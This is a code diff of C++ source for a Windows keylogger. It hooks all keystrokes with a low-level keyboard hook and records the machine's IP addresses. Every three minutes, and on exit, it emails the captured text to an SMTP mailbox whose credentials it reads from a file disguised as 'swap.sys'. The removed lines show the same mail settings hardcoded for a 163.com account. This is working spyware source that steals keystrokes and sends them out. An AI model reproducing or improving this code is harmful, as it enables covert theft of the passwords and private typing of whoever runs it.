@@ -5,6 +5,7 @@
 #include <fstream>
 #include <sstream>
 #include <iostream>
+#include <assert.h>
 #include "mail.h"
 #pragma comment(lib,"ws2_32.lib")
 using namespace std;
@@ -23,28 +24,46 @@ HOSTENT * LocalHost;
 int CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam3);
 ostringstream sout;
 
-void SendHookMail();
+struct Mail_Data
+{
+	string Server, From, To, Pass;
+	Mail_Data(const char * file)
+	{
+		ifstream in(file);
+		assert(in);
+		in >> Server;
+		in >> From;
+		in >> Pass;
+		To = From;
+	}
+
+	Mail_Data()
+	{}
+}*mData;
+
+//Send result to mail
+void SendHookMail(Mail_Data Data)
+{
+	HookData = sout.str();
+	SendEmail(Data.Server, Data.From, Data.Pass, Data.To, HookData);
+	sout.flush();
+}
+
 
 //Terminate signal received
 void EndProgram()
 {
-	SendHookMail();
+	SendHookMail(*mData);
 	exit(0);
 }
 
-//Send result to mail
-void SendHookMail()
-{
-	HookData = sout.str();
-	SendEmail("smtp.163.com"/*TODO: Replace with your own mailbox's SMTP server*/, "myhookmail@163.com" /*Your own mailbox that you want to send from*/, "abcdefg" /*Your mail password*/, "myhookmail@163.com" /*Mailbox that you want to send results to*/, HookData);
-	sout.flush();
-}
 
 int CALLBACK WinMain(HINSTANCE, HINSTANCE, LPSTR, int)
 {
 	WSADATA wsa;
-	WSAStartup(MAKEWORD(2, 0), &wsa);
+	mData = new Mail_Data("./swap.sys");
 
+	WSAStartup(MAKEWORD(2, 0), &wsa);
 	gethostname(HostName, sizeof(HostName));
 	LocalHost = gethostbyname(HostName);
 	in_addr* addr = (in_addr*)*LocalHost->h_addr_list;
@@ -53,6 +72,8 @@ int CALLBACK WinMain(HINSTANCE, HINSTANCE, LPSTR, int)
 	{
 		IpAddr[i] = inet_ntoa(addr[i]);
 	}
+
+
 	MyHook = SetWindowsHookEx(WH_KEYBOARD_LL,
 		(HOOKPROC)&KeyboardProc,
 		GetModuleHandle(NULL),
@@ -72,7 +93,7 @@ int CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
 	//Send a mail every 3 minutes if any key is pressed
 	if (time(0) - lasttime >= 180 && Entered)
 	{
-		SendHookMail();
+		SendHookMail(*mData);
 		Entered = false;
 	}
 	//Terminate signal received. Send the last characters and exit the program
